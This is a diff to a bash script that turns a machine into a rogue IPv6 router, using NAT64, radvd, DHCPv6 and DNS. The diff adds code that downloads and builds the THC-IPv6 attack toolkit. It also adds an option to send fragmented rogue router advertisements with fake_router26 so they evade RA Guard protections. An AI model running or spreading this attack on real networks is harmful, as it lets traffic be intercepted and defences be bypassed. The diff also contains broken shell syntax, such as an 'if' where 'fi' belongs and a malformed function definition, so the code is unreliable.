@@ -7,6 +7,7 @@ PATH="/usr/bin:/usr/sbin:/bin:/sbin"
 # Run me as root!
 
 #GLOBALS
+FRAGMENT=false
 #TAYGAINTERFACE default name for the Tayga virtual interface
 TAYGAINTERFACE="nat64"
 #DEFAULT6PREFIX default IPv6 prefix to present, we're assuming the reserved 64:FF9B::/96
@@ -209,6 +210,19 @@ function isPkgInstalled {
 function installPrereqDpkgs {
     /usr/bin/apt-get install -y sipcalc tayga radvd wide-dhcpv6-server bind9
 }
+#Install THC-IPv6 Toolkit
+function installTHC{
+    #assuming that if fake_router6 is installed, everything's installed. reasonable?
+    if ! whereis fake_router6;
+    then
+	wget http://www.thc.org/releases/thc-ipv6-2.3.tar.gz
+	tar -zxvf thc-ipv6-2.3.tar.gz
+	cd thc-ipv6-2.3
+	make install
+	#cleanup
+	rm -rf thc-ipv6-2.3.tar.gz
+    fi
+}
 #Set up Taya interface, IP addresses and routes, and and start Tayga
 function startTayga {
     # Set up interfaces
@@ -239,6 +253,7 @@ function stopTayga {
 #Kind of mindless for now just install the packages we need first
 echo "Welcome, I'll install a few packages and ask a couple of questions first"
 installPrereqDpkgs
+installTHC
 # Prompt for network interface to use
 read -p "Please enter the interface name to listen on (default ${DINTERFACE}): " DINTERFACE
 echo "This is your current address information: "
@@ -246,6 +261,11 @@ sipcalc $DINTERFACE
 # Prompt for second IP on the subnet
 read -p "Please enter an additional available IPv4 address in this range: " DSECONDIP
 #TODO check whether RA Guard is on the system, configure accordingly.
+read -p "Fragment router advertisements to evade RA Guard?"
+if [[ $REPLY =~ [Yy] ]]
+then
+    FRAGMENT=true
+if
 #Configure these system parameters in a non-persistent way for now
 loadIPv6Module
 enableForwarding
@@ -254,7 +274,10 @@ clearIpTables
 stopTayga
 
 setBind9Options
-setRADvdConf
+if ! $FRAGMENT
+then
+    setRADvdConf
+fi
 setWideDhcp6Conf
 setTaygaConf
 #Most of the non-persistent configuration is in startTayga
@@ -264,8 +287,13 @@ if startTayga; then
     #TODO: check if we need to enable them
     service radvd stop
     sleep 3
+    if $FRAGMENT
+    then
     #service radvd start
-    fake_router26 eth0 -E D -A ${DEFAULT6PREFIX}:/${DIP6CIDR} -F other & 
+	fake_router26 eth0 -E D -A ${DEFAULT6PREFIX}:/${DIP6CIDR} -F other & 
+    else
+	service radvd start
+    fi
     service bind9 restart
     service wide-dhcpv6-server restart
     #More non-persistent configuration
